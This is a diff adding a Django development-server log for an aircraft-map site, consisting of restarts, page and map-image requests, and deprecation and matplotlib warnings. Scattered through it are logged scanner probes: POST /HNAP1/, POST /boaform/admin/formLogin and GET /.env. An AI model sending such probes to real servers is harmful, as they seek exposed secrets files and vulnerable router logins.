@@ -1,0 +1,913 @@
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 28, 2023 - 18:17:07
+Django version 4.1.1, using settings 'opensky_aircraft.settings'
+Starting development server at http://127.0.0.1:8000/
+Quit the server with CONTROL-C.
+[28/Apr/2023 18:17:19] "GET / HTTP/1.0" 404 179
+[28/Apr/2023 18:17:19] "GET /favicon.ico HTTP/1.0" 404 179
+[28/Apr/2023 18:17:21] "GET /index HTTP/1.0" 301 0
+[28/Apr/2023 18:17:22] "GET /index/ HTTP/1.0" 500 145
+[28/Apr/2023 18:18:13] "GET /index/ HTTP/1.0" 500 145
+[28/Apr/2023 18:18:15] "GET /index/ HTTP/1.0" 500 145
+[28/Apr/2023 18:18:36] "GET /index/ HTTP/1.0" 500 145
+[28/Apr/2023 18:18:54] "GET /index/ HTTP/1.0" 500 145
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 28, 2023 - 18:21:45
+Django version 4.1.1, using settings 'opensky_aircraft.settings'
+Starting development server at http://127.0.0.1:8000/
+Quit the server with CONTROL-C.
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[28/Apr/2023 18:21:50] "GET /index/ HTTP/1.0" 200 2752
+[28/Apr/2023 18:21:50] "GET /static/maps/map.png HTTP/1.0" 200 43192
+[28/Apr/2023 18:21:56] "GET /static/maps/map.png HTTP/1.0" 200 43192
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[28/Apr/2023 18:23:57] "GET /index/ HTTP/1.0" 200 2577
+[28/Apr/2023 18:23:57] "GET /static/maps/map.png HTTP/1.0" 200 42372
+[28/Apr/2023 18:24:09] "GET /static/maps/map.png HTTP/1.0" 304 0
+[28/Apr/2023 18:24:26] "GET /static/maps/map.png HTTP/1.0" 304 0
+[28/Apr/2023 18:25:20] "GET /static/maps/map.png HTTP/1.0" 304 0
+[28/Apr/2023 18:25:52] "GET /static/maps/map.png HTTP/1.0" 304 0
+[28/Apr/2023 18:25:56] "GET /index/ HTTP/1.0" 200 2577
+[28/Apr/2023 18:26:13] "GET /static/maps/map.png HTTP/1.0" 304 0
+[28/Apr/2023 18:26:25] "GET /static/maps/map.png HTTP/1.0" 304 0
+[28/Apr/2023 18:26:43] "GET /static/maps/map.png HTTP/1.0" 304 0
+[28/Apr/2023 18:27:06] "GET /static/maps/map.png HTTP/1.0" 304 0
+[28/Apr/2023 18:27:15] "GET / HTTP/1.0" 404 179
+[28/Apr/2023 18:27:26] "GET /static/maps/map.png HTTP/1.0" 304 0
+Watching for file changes with StatReloader
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 28, 2023 - 18:28:28
+Django version 4.1.1, using settings 'opensky_aircraft.settings'
+Starting development server at http://127.0.0.1:8000/
+Quit the server with CONTROL-C.
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[28/Apr/2023 18:28:32] "GET /index/ HTTP/1.0" 200 2930
+[28/Apr/2023 18:28:33] "GET /static/maps/map.png HTTP/1.0" 200 48129
+Not Found: /
+[28/Apr/2023 18:28:42] "GET / HTTP/1.0" 404 2070
+[28/Apr/2023 18:28:47] "GET /static/maps/map.png HTTP/1.0" 304 0
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[28/Apr/2023 18:30:48] "GET /index/ HTTP/1.0" 200 2755
+[28/Apr/2023 18:30:49] "GET /static/maps/map.png HTTP/1.0" 200 48808
+[28/Apr/2023 18:31:29] "GET /static/maps/map.png HTTP/1.0" 304 0
+/home/django/belarus-website/opensky_aircraft/settings.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 28, 2023 - 18:33:07
+Django version 4.1.1, using settings 'opensky_aircraft.settings'
+Starting development server at http://127.0.0.1:8000/
+Quit the server with CONTROL-C.
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[28/Apr/2023 18:33:31] "GET /index/ HTTP/1.0" 200 2755
+[28/Apr/2023 18:33:31] "GET /static/maps/map.png HTTP/1.0" 200 49374
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[28/Apr/2023 18:35:34] "GET /index/ HTTP/1.0" 200 2755
+[28/Apr/2023 18:35:34] "GET /static/maps/map.png HTTP/1.0" 200 48978
+[28/Apr/2023 18:36:19] "GET /static/maps/map.png HTTP/1.0" 304 0
+[28/Apr/2023 18:36:31] "GET / HTTP/1.0" 404 179
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 28, 2023 - 18:38:50
+Django version 4.1.1, using settings 'opensky_aircraft.settings'
+Starting development server at http://127.0.0.1:8000/
+Quit the server with CONTROL-C.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 28, 2023 - 18:41:14
+Django version 4.1.1, using settings 'opensky_aircraft.settings'
+Starting development server at http://127.0.0.1:8000/
+Quit the server with CONTROL-C.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+
+You have 19 unapplied migration(s). Your project may not work properly until you apply the migrations for app(s): admin, aircraft, auth, contenttypes, sessions.
+Run 'python manage.py migrate' to apply them.
+April 28, 2023 - 19:12:08
+Django version 4.1.1, using settings 'opensky_aircraft.settings'
+Starting development server at http://127.0.0.1:8000/
+Quit the server with CONTROL-C.
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[28/Apr/2023 19:12:39] "GET /index/ HTTP/1.0" 200 2038
+[28/Apr/2023 19:12:40] "GET /static/maps/map.png HTTP/1.0" 200 35307
+[28/Apr/2023 19:12:49] "GET / HTTP/1.0" 404 179
+[28/Apr/2023 19:12:53] "GET /static/maps/map.png HTTP/1.0" 304 0
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[28/Apr/2023 19:14:55] "GET /index/ HTTP/1.0" 200 2037
+[28/Apr/2023 19:14:55] "GET /static/maps/map.png HTTP/1.0" 200 37232
+[28/Apr/2023 19:16:42] "GET /static/maps/map.png HTTP/1.0" 304 0
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[28/Apr/2023 19:17:37] "GET /index/ HTTP/1.0" 200 2037
+[28/Apr/2023 19:17:37] "GET /static/maps/map.png HTTP/1.0" 200 37362
+[28/Apr/2023 19:17:59] "GET / HTTP/1.0" 404 179
+[28/Apr/2023 19:18:41] "GET /static/maps/map.png HTTP/1.0" 304 0
+[28/Apr/2023 19:19:55] "GET / HTTP/1.0" 404 179
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[28/Apr/2023 19:20:17] "GET /index/ HTTP/1.0" 200 1854
+[28/Apr/2023 19:20:18] "GET /static/maps/map.png HTTP/1.0" 200 37362
+[28/Apr/2023 19:20:25] "GET /static/maps/map.png HTTP/1.0" 304 0
+[28/Apr/2023 19:20:33] "GET /static/maps/map.png HTTP/1.0" 304 0
+[28/Apr/2023 19:20:48] "GET /index/ HTTP/1.0" 200 1854
+[28/Apr/2023 19:20:48] "GET /static/maps/map.png HTTP/1.0" 200 37362
+[28/Apr/2023 19:20:48] "GET /favicon.ico HTTP/1.0" 404 179
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[28/Apr/2023 19:22:50] "GET /index/ HTTP/1.0" 200 1854
+[28/Apr/2023 19:22:51] "GET /static/maps/map.png HTTP/1.0" 200 37362
+[28/Apr/2023 19:24:41] "GET / HTTP/1.0" 400 143
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[28/Apr/2023 19:24:52] "GET /index/ HTTP/1.0" 200 1854
+[28/Apr/2023 19:24:52] "GET /static/maps/map.png HTTP/1.0" 200 37362
+[28/Apr/2023 19:25:00] "GET /static/maps/map.png HTTP/1.0" 304 0
+[28/Apr/2023 19:28:56] "GET / HTTP/1.0" 400 143
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[28/Apr/2023 19:31:09] "GET /index/ HTTP/1.0" 200 1854
+[28/Apr/2023 19:31:10] "GET /static/maps/map.png HTTP/1.0" 200 37362
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[28/Apr/2023 19:33:11] "GET /index/ HTTP/1.0" 200 1854
+[28/Apr/2023 19:33:11] "GET /static/maps/map.png HTTP/1.0" 200 37362
+[28/Apr/2023 19:34:31] "GET /static/maps/map.png HTTP/1.0" 304 0
+[28/Apr/2023 19:34:55] "GET /static/maps/map.png HTTP/1.0" 304 0
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[28/Apr/2023 19:36:15] "GET /index/ HTTP/1.0" 200 2039
+[28/Apr/2023 19:36:15] "GET /static/maps/map.png HTTP/1.0" 200 38890
+[28/Apr/2023 19:36:40] "GET /static/maps/map.png HTTP/1.0" 304 0
+[28/Apr/2023 19:38:14] "GET /index/ HTTP/1.0" 200 2039
+[28/Apr/2023 19:38:14] "GET /static/maps/map.png HTTP/1.0" 304 0
+[28/Apr/2023 19:38:38] "GET /static/maps/map.png HTTP/1.0" 304 0
+[28/Apr/2023 19:38:47] "GET /static/maps/map.png HTTP/1.0" 304 0
+[28/Apr/2023 19:39:04] "GET /static/maps/map.png HTTP/1.0" 304 0
+[28/Apr/2023 19:39:21] "GET /static/maps/map.png HTTP/1.0" 304 0
+[28/Apr/2023 19:39:28] "GET / HTTP/1.0" 404 179
+[28/Apr/2023 19:39:41] "GET /static/maps/map.png HTTP/1.0" 304 0
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[28/Apr/2023 19:40:22] "GET /index/ HTTP/1.0" 200 2403
+[28/Apr/2023 19:40:22] "GET /static/maps/map.png HTTP/1.0" 200 41747
+[28/Apr/2023 19:42:01] "GET / HTTP/1.0" 404 179
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+/home/django/belarus-website/map.py:12: RuntimeWarning: More than 20 figures have been opened. Figures created through the pyplot interface (`matplotlib.pyplot.figure`) are retained until explicitly closed and may consume too much memory. (To control this warning, see the rcParam `figure.max_open_warning`). Consider using `matplotlib.pyplot.close()`.
+  self.fig, self.ax = plt.subplots(figsize=(10, 10))
+[28/Apr/2023 19:42:23] "GET /index/ HTTP/1.0" 200 2403
+[28/Apr/2023 19:42:24] "GET /static/maps/map.png HTTP/1.0" 200 42818
+[28/Apr/2023 19:43:15] "GET /static/maps/map.png HTTP/1.0" 304 0
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[28/Apr/2023 19:45:17] "GET /index/ HTTP/1.0" 200 2402
+[28/Apr/2023 19:45:19] "GET /static/maps/map.png HTTP/1.0" 200 44311
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[28/Apr/2023 19:47:18] "GET /index/ HTTP/1.0" 200 2576
+[28/Apr/2023 19:47:19] "GET /static/maps/map.png HTTP/1.0" 200 46075
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[28/Apr/2023 19:49:35] "GET /index/ HTTP/1.0" 200 2576
+[28/Apr/2023 19:49:35] "GET /static/maps/map.png HTTP/1.0" 200 47012
+[28/Apr/2023 20:00:43] "GET / HTTP/1.0" 404 179
+[28/Apr/2023 20:03:58] "GET / HTTP/1.0" 404 179
+[28/Apr/2023 20:04:29] "GET / HTTP/1.0" 404 179
+[28/Apr/2023 20:04:38] "GET / HTTP/1.0" 404 179
+[28/Apr/2023 20:34:34] "GET / HTTP/1.0" 404 179
+[28/Apr/2023 20:37:20] "GET / HTTP/1.0" 404 179
+[28/Apr/2023 20:45:29] "GET / HTTP/1.0" 404 179
+[28/Apr/2023 20:45:29] "GET / HTTP/1.0" 404 179
+[28/Apr/2023 21:01:03] "GET / HTTP/1.0" 404 179
+[28/Apr/2023 21:15:06] "GET / HTTP/1.0" 404 179
+[28/Apr/2023 21:15:07] "POST /HNAP1/ HTTP/1.0" 404 179
+[28/Apr/2023 21:25:34] "GET / HTTP/1.0" 400 143
+[28/Apr/2023 21:32:14] "GET /0bef HTTP/1.0" 400 143
+[28/Apr/2023 21:39:28] "GET / HTTP/1.0" 404 179
+[28/Apr/2023 21:39:40] "POST /boaform/admin/formLogin HTTP/1.0" 404 179
+[28/Apr/2023 21:39:43] "GET / HTTP/1.0" 400 143
+[28/Apr/2023 22:01:01] "GET / HTTP/1.0" 404 179
+[28/Apr/2023 22:33:30] "GET / HTTP/1.0" 404 179
+[28/Apr/2023 22:43:55] "GET / HTTP/1.0" 404 179
+[28/Apr/2023 22:57:48] "GET / HTTP/1.0" 404 179
+[28/Apr/2023 22:57:48] "GET / HTTP/1.0" 404 179
+[28/Apr/2023 23:06:42] "GET / HTTP/1.0" 400 143
+[28/Apr/2023 23:07:29] "GET /.env HTTP/1.0" 404 179
+[28/Apr/2023 23:12:43] "GET / HTTP/1.0" 404 179
+[28/Apr/2023 23:20:38] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 00:04:24] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 00:38:53] "GET / HTTP/1.0" 400 143
+[29/Apr/2023 00:38:53] "GET /favicon.ico HTTP/1.0" 400 143
+[29/Apr/2023 00:39:50] "GET /robots.txt HTTP/1.0" 400 143
+[29/Apr/2023 00:39:50] "GET /favicon.ico HTTP/1.0" 400 143
+[29/Apr/2023 00:46:09] "GET / HTTP/1.0" 400 143
+[29/Apr/2023 00:57:40] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 01:01:09] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 01:22:13] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 01:37:27] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 02:01:48] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 02:01:48] "POST /HNAP1/ HTTP/1.0" 404 179
+[29/Apr/2023 02:05:32] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 02:08:20] "GET / HTTP/1.0" 400 143
+[29/Apr/2023 02:10:05] "GET /.env HTTP/1.0" 400 143
+[29/Apr/2023 02:10:05] "GET /.env HTTP/1.0" 400 143
+[29/Apr/2023 02:18:20] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 02:28:23] "GET / HTTP/1.0" 400 143
+[29/Apr/2023 02:53:17] "GET / HTTP/1.0" 400 143
+[29/Apr/2023 03:06:36] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 03:09:01] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 03:09:02] "GET / HTTP/1.0" 404 179
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 03:09:06] "GET /index/ HTTP/1.0" 200 2037
+[29/Apr/2023 03:09:07] "GET /static/maps/map.png HTTP/1.0" 200 35307
+[29/Apr/2023 03:09:37] "GET /static/maps/map.png HTTP/1.0" 304 0
+[29/Apr/2023 03:10:00] "GET /static HTTP/1.0" 404 179
+[29/Apr/2023 03:10:05] "GET /static/maps/map.png HTTP/1.0" 304 0
+[29/Apr/2023 03:10:19] "GET /index/ HTTP/1.0" 200 2037
+[29/Apr/2023 03:10:19] "GET /static/maps/map.png HTTP/1.0" 200 35307
+[29/Apr/2023 03:10:19] "GET /favicon.ico HTTP/1.0" 404 179
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 03:12:20] "GET /index/ HTTP/1.0" 200 2040
+[29/Apr/2023 03:12:20] "GET /static/maps/map.png HTTP/1.0" 200 37148
+[29/Apr/2023 03:13:24] "GET /static/maps/map.png HTTP/1.0" 304 0
+[29/Apr/2023 03:13:56] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 03:14:08] "GET /static/maps/map.png HTTP/1.0" 304 0
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 03:16:10] "GET /index/ HTTP/1.0" 200 2216
+[29/Apr/2023 03:16:10] "GET /static/maps/map.png HTTP/1.0" 200 39922
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 29, 2023 - 03:24:06
+Django version 4.1.1, using settings 'opensky_aircraft.settings'
+Starting development server at http://127.0.0.1:8000/
+Quit the server with CONTROL-C.
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 03:24:10] "GET /index/ HTTP/1.0" 200 2029
+[29/Apr/2023 03:24:10] "GET /static/maps/map.png HTTP/1.0" 200 35307
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 03:26:11] "GET /index/ HTTP/1.0" 200 2029
+[29/Apr/2023 03:26:12] "GET /static/maps/map.png HTTP/1.0" 200 37200
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 03:28:14] "GET /index/ HTTP/1.0" 200 2029
+[29/Apr/2023 03:28:14] "GET /static/maps/map.png HTTP/1.0" 200 37672
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 03:30:15] "GET /index/ HTTP/1.0" 200 2030
+[29/Apr/2023 03:30:15] "GET /static/maps/map.png HTTP/1.0" 200 37939
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 03:32:17] "GET /index/ HTTP/1.0" 200 2029
+[29/Apr/2023 03:32:17] "GET /static/maps/map.png HTTP/1.0" 200 38129
+[29/Apr/2023 03:32:22] "GET /static/maps/map.png HTTP/1.0" 304 0
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 03:34:23] "GET /index/ HTTP/1.0" 200 2028
+[29/Apr/2023 03:34:24] "GET /static/maps/map.png HTTP/1.0" 200 38248
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 03:36:25] "GET /index/ HTTP/1.0" 200 2027
+[29/Apr/2023 03:36:25] "GET /static/maps/map.png HTTP/1.0" 200 38494
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 03:38:26] "GET /index/ HTTP/1.0" 200 2027
+[29/Apr/2023 03:38:26] "GET /static/maps/map.png HTTP/1.0" 200 38547
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 03:40:28] "GET /index/ HTTP/1.0" 200 2201
+[29/Apr/2023 03:40:28] "GET /static/maps/map.png HTTP/1.0" 200 40176
+[29/Apr/2023 03:40:46] "GET /static/maps/map.png HTTP/1.0" 304 0
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 03:42:47] "GET /index/ HTTP/1.0" 200 2028
+[29/Apr/2023 03:42:47] "GET /static/maps/map.png HTTP/1.0" 200 40186
+[29/Apr/2023 03:43:11] "GET /static/maps/map.png HTTP/1.0" 304 0
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+/home/django/belarus-website/map.py:12: RuntimeWarning: More than 20 figures have been opened. Figures created through the pyplot interface (`matplotlib.pyplot.figure`) are retained until explicitly closed and may consume too much memory. (To control this warning, see the rcParam `figure.max_open_warning`). Consider using `matplotlib.pyplot.close()`.
+  self.fig, self.ax = plt.subplots(figsize=(10, 10))
+[29/Apr/2023 03:45:12] "GET /index/ HTTP/1.0" 200 2028
+[29/Apr/2023 03:45:12] "GET /static/maps/map.png HTTP/1.0" 200 40484
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 03:47:13] "GET /index/ HTTP/1.0" 200 2029
+[29/Apr/2023 03:47:13] "GET /static/maps/map.png HTTP/1.0" 200 40538
+[29/Apr/2023 03:49:00] "GET / HTTP/1.0" 404 179
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 03:49:15] "GET /index/ HTTP/1.0" 200 2028
+[29/Apr/2023 03:49:15] "GET /static/maps/map.png HTTP/1.0" 200 40581
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 03:51:16] "GET /index/ HTTP/1.0" 200 1854
+[29/Apr/2023 03:51:16] "GET /static/maps/map.png HTTP/1.0" 200 40581
+[29/Apr/2023 03:52:19] "GET / HTTP/1.0" 404 179
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 03:53:18] "GET /index/ HTTP/1.0" 200 1854
+[29/Apr/2023 03:53:18] "GET /static/maps/map.png HTTP/1.0" 200 40581
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 03:55:19] "GET /index/ HTTP/1.0" 200 1854
+[29/Apr/2023 03:55:19] "GET /static/maps/map.png HTTP/1.0" 200 40581
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 03:57:20] "GET /index/ HTTP/1.0" 200 1854
+[29/Apr/2023 03:57:20] "GET /static/maps/map.png HTTP/1.0" 200 40581
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 03:59:22] "GET /index/ HTTP/1.0" 200 1854
+[29/Apr/2023 03:59:22] "GET /static/maps/map.png HTTP/1.0" 200 40581
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 04:01:23] "GET /index/ HTTP/1.0" 200 1854
+[29/Apr/2023 04:01:24] "GET /static/maps/map.png HTTP/1.0" 200 40581
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 04:03:25] "GET /index/ HTTP/1.0" 200 1854
+[29/Apr/2023 04:03:25] "GET /static/maps/map.png HTTP/1.0" 200 40581
+[29/Apr/2023 04:03:25] "GET /favicon.ico HTTP/1.0" 404 179
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 04:05:26] "GET /index/ HTTP/1.0" 200 1854
+[29/Apr/2023 04:05:26] "GET /static/maps/map.png HTTP/1.0" 200 40581
+[29/Apr/2023 04:06:26] "GET / HTTP/1.0" 404 179
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 04:07:27] "GET /index/ HTTP/1.0" 200 1854
+[29/Apr/2023 04:07:27] "GET /static/maps/map.png HTTP/1.0" 200 40581
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 04:09:29] "GET /index/ HTTP/1.0" 200 1854
+[29/Apr/2023 04:09:29] "GET /static/maps/map.png HTTP/1.0" 200 40581
+[29/Apr/2023 04:11:09] "GET /static/maps/map.png HTTP/1.0" 304 0
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 04:13:10] "GET /index/ HTTP/1.0" 200 1854
